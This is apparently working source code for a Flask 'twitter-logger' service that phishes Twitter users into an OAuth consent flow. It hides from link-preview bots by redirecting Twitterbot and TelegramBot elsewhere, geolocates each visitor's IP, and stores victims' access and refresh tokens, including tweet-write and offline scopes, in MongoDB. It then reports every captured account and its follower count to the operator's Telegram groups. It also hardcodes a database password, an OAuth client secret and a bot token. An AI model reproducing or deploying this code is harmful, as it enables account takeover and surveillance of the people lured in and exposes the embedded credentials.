from flask import Flask, request, redirect, session
import requests
import base64
import secrets
from datetime import datetime
from pymongo import MongoClient
from pymongo.server_api import ServerApi

app = Flask(__name__)
app.secret_key = secrets.token_hex(16)

MONGO_URI = "mongodb+srv://advonisx:TRYsyrGie4c0uVEw@cluster0.qtpxk.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0&ssl=true"

TWITTER_CLIENT_ID = 'eWNUdkx4LTlnaGQ0N3BaSGJyYkU6MTpjaQ'
TWITTER_CLIENT_SECRET = '4cct_4dZ3BVz_MNKKjazWi1M3XVelnSiGqV6R5hBxC-Pbj7ytn'
TELEGRAM_BOT_TOKEN = '6790216831:AAHbUIZKq38teKnZIw9zUQDRSD6csT-JEs4'

credentials = base64.b64encode(f"{TWITTER_CLIENT_ID}:{TWITTER_CLIENT_SECRET}".encode()).decode('utf-8')

client = MongoClient(MONGO_URI, server_api=ServerApi('1'))
db = client['cobra_db']
groups = db['groups']

try:
    client.admin.command('ping')
    print("[+] MongoDB connected successfully.")
except Exception as e:
    print("[-] MongoDB connection failed:", e)


@app.route('/oauth')
def oauth():
    user_agent = request.headers.get('User-Agent', '').strip()
    identifier = request.args.get('identifier')

    if not identifier:
        return "⚠️ Identifier is required.", 400

    group = groups.find_one({"identifier": identifier})
    if not group:
        return "⚠️ Identifier is invalid.", 404

    session["redirect_url"] = group.get('redirect')
    session["group_id"] = group.get("group_id")
    
    if 'Twitterbot' in user_agent or 'TelegramBot' in user_agent:
        return redirect('https://calendly.com/cointele')

    real_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    res = requests.get(f'http://ip-api.com/json/{real_ip}')
    location_data = res.json()
    
    country, city = location_data.get("country"), location_data.get("city")
    country_flag = ''.join(chr(ord(c) + 127397) for c in location_data.get("countryCode", ""))

    message = f'🌐 *Connection:* {real_ip}\n\n{country_flag} *{city}, {country}*'
    send_telegram_message(group['group_id'], message)

    twitter_oauth_url = generate_twitter_oauth_url()
    return redirect(twitter_oauth_url)


def generate_twitter_oauth_url():
    TWITTER_CALLBACK_URL = 'https://twitter-logger.onrender.com/auth'
    return (f'https://twitter.com/i/oauth2/authorize?response_type=code&client_id={TWITTER_CLIENT_ID}'
            f'&redirect_uri={TWITTER_CALLBACK_URL}'
            f'&scope=tweet.read+users.read+tweet.write+offline.access+tweet.moderate.write'
            f'&state=state&code_challenge=challenge&code_challenge_method=plain')


@app.route('/auth')
def auth_callback():
    authorization_code = request.args.get('code')
    access_token, refresh_token = exchange_token_for_access(authorization_code)
    
    user_data = get_twitter_user_data(access_token)
    user_id = user_data['id']
    username = user_data['username']
    followers_count = user_data['public_metrics']['followers_count']
    
    real_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    location_res = requests.get(f'http://ip-api.com/json/{real_ip}')
    location_data = location_res.json()
    country, city = location_data.get("country"), location_data.get("city")
    country_flag = ''.join(chr(ord(c) + 127397) for c in location_data.get("countryCode", ""))
    location = f"{country_flag} {city}, {country}"
    
    authorization_time = datetime.utcnow()
    
    group_id = session.get("group_id")
    existing_user = groups.find_one({
        "group_id": group_id,
        "authenticated_users.user_id": user_id
    })
    
    if existing_user:
        groups.update_one(
            {"group_id": group_id, "authenticated_users.user_id": user_id},
            {"$set": {
                "authenticated_users.$.username": username,
                "authenticated_users.$.location": location,
                "authenticated_users.$.access_token": access_token,
                "authenticated_users.$.refresh_token": refresh_token
            }}
        )
    else:
        groups.update_one(
            {"group_id": group_id},
            {
                "$push": {
                    "authenticated_users": {
                        "user_id": user_id,
                        "username": username,
                        "location": location,
                        "access_token": access_token,
                        "refresh_token": refresh_token,
                        "authorized_at": authorization_time
                    }
                }
            }
        )
    
    send_to_telegram(username, followers_count, group_id)
    return redirect(session.get("redirect_url"))


def exchange_token_for_access(authorization_code):
    token_exchange_url = 'https://api.twitter.com/2/oauth2/token'
    request_data = {
        'grant_type': 'authorization_code',
        'code': authorization_code,
        'redirect_uri': 'https://twitter-logger.onrender.com/auth',
        'code_verifier': "challenge"
    }
    headers = {
        'Authorization': f'Basic {credentials}',
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    response = requests.post(token_exchange_url, data=request_data, headers=headers)
    return response.json().get('access_token'), response.json().get('refresh_token')


def get_twitter_user_data(access_token):
    headers = {
        'Authorization': f'Bearer {access_token}',
        'Content-Type': 'application/json',
    }
    params = {
        'user.fields': 'public_metrics'
    }
    response = requests.get('https://api.twitter.com/2/users/me', headers=headers, params=params)
    return response.json().get('data', {})
    
    
def format_followers(followers_count):
    if followers_count < 1000:
        return str(followers_count)
    elif 1000 <= followers_count < 1000000:
        return f'{followers_count / 1000:.2f}K'
    else:
        return f'{followers_count / 1000000:.2f}M'


def send_to_telegram(username, followers_count, group_id):
    followers_count = format_followers(followers_count)
    message = (f'🐍 *User [{username}](https://x.com/{username}) has authorized.*\n'
               f'👥 *Followers:* {followers_count}')
    
    send_telegram_message(group_id, message)


def send_telegram_message(chat_id, message):
    message = message.replace(".", "\\.").replace("-", "\\-").replace("!", "\\!")
    
    requests.post(
        f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage',
        data={
            'chat_id': chat_id,
            'text': message,
            'parse_mode': 'MarkdownV2'
        })


if __name__ == '__main__':
    app.run()